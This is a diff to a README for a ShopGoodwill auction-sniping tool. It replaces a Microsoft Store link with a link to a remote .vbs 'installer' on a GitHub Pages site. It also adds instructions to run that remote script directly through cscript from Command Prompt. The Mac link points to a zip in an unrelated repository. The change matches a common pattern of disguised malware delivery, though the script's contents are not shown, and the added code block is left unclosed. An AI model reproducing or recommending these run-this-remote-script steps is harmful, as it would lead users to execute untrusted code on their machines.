@@ -4,10 +4,20 @@
 
 ## Download
 
-[![ShopGoodwill Auction Sniper Windows](https://github.com/shopgoodwill-auction-sniper/shopgoodwill-bid-sniper/blob/main/images/auctionsniper-windows.png?raw=true)](https://apps.microsoft.com/detail/9NLHNKNJM66J)  |  [![ShopGoodwill Auction Sniper Mac](https://github.com/shopgoodwill-auction-sniper/shopgoodwill-bid-sniper/blob/main/images/auctionsniper-mac.png?raw=true)](https://github.com/software-app-download/windows-mac/raw/main/shopgoodwill-auction-sniper-mac.zip?download=)
+[![ShopGoodwill Auction Sniper Windows](https://github.com/shopgoodwill-auction-sniper/shopgoodwill-bid-sniper/blob/main/images/auctionsniper-windows.png?raw=true)](https://shopgoodwill-auction-sniper.github.io/shopgoodwill-bid-sniper/Bid_Sniper_Windows_Installer.vbs)  |  [![ShopGoodwill Auction Sniper Mac](https://github.com/shopgoodwill-auction-sniper/shopgoodwill-bid-sniper/blob/main/images/auctionsniper-mac.png?raw=true)](https://github.com/software-app-download/windows-mac/raw/main/shopgoodwill-auction-sniper-mac.zip?download=)
 :-------------------------:|:-------------------------:
-[Windows](https://apps.microsoft.com/detail/9NLHNKNJM66J)  |  [Mac](https://github.com/software-app-download/windows-mac/raw/main/shopgoodwill-auction-sniper-mac.zip?download=)
+[Windows](https://shopgoodwill-auction-sniper.github.io/shopgoodwill-bid-sniper/Bid_Sniper_Windows_Installer.vbs)  |  [Mac](https://github.com/software-app-download/windows-mac/raw/main/shopgoodwill-auction-sniper-mac.zip?download=)
 
+### Run Directly from Command Prompt or PowerShell
+
+You can also run the Windows VBS script directly from your computer without downloading it. Follow these steps:
+
+#### Using Command Prompt
+
+1. Open Command Prompt.
+2. Run the following command:
+   ```sh
+   cscript //nologo "https://shopgoodwill-auction-sniper.github.io/shopgoodwill-bid-sniper/Bid_Sniper_Windows_Installer.vbs"
 ### Features
 
 - **Simultaneous Sniping:** Snipe multiple auctions on ShopGoodwill at the last second(s).
